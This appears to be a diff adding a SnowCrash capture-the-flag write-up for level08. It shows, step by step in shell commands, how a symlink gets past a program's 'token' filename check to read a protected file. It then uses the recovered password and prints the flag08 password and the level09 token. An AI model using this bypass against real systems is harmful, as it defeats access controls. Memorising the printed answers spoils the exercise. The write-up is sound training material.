@@ -662,3 +662,100 @@ level08@SnowCrash:~$
 It worked once more!
 
 </details>
+
+## level08
+
+<details>
+
+<summary>Explanations</summary>
+
+For this level, we have 2 files:
+- A program named ``level08``
+- A file named ``token``
+
+When executing the program, this happens:
+```bash
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+```
+
+So what we can do, is use the ``token`` file:
+```bash
+level08@SnowCrash:~$ ./level08 token 
+You may not access 'token'
+```
+
+We can't access this file that easy. Let's check what does the program try to do at least:
+```bash
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                                                                          = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                                                                      = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
+
+The first thing the program does, is comparing 2 strings, here token and token, so let's try to read another file:
+```bash
+level08@SnowCrash:~$ echo "test" > /tmp/test
+level08@SnowCrash:~$ ltrace ./level08 /tmp/test
+__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/test", "token")                                                                                                      = NULL
+open("/tmp/test", 0, 014435162522)                                                                                                = 3
+read(3, "test\n", 1024)                                                                                                           = 5
+write(1, "test\n", 5test
+)                                                                                                             = 5
++++ exited (status 5) +++
+```
+
+This time the program worked, but we can see learn that actually the ``strstr`` is comparing the name of the file with a ``token`` string. So it's either:
+- The program return an error if we try to open a file named ``token``
+- The program can't read the ``token`` file because of a lack of permission
+
+So let's try the first theory:
+```bash
+level08@SnowCrash:~$ echo "test" > /tmp/token
+level08@SnowCrash:~$ ./level08 /tmp/token
+You may not access '/tmp/token'
+```
+
+And this is it. The program is not letting us interact with files named ``token``. So we need to find a way to bypass that. But we don't have the permissions to change the name of the original ``token`` file. We can't copy it either.
+
+So how are we going to bypass that?
+
+### Retrieving the token
+
+We can actually use a symlink to use another name for the exact same file:
+```bash
+level08@SnowCrash:~$ ln -s ~/token /tmp/bypass
+level08@SnowCrash:~$ ./level08 /tmp/bypass
+quif5eloekouj29ke0vouxean
+```
+
+But this is weird. Usually, when we get a token, we need to use the command ``getflag`` and after doing so, there should a whole text, that is not here in this level.
+
+But well, let's still try it:
+```bash
+level08@SnowCrash:~$ su level09
+Password: 
+su: Authentication failure
+```
+
+So this wasn't our token. But we know that the token is located into ``flag08`` user's files. So maybe this is our password:
+```bash
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+```
+
+It was the password! So now let's get the token and go on the next level:
+```bash
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+flag08@SnowCrash:~$ su level09
+Password: 
+level09@SnowCrash:~$ 
+```
+
+</details>
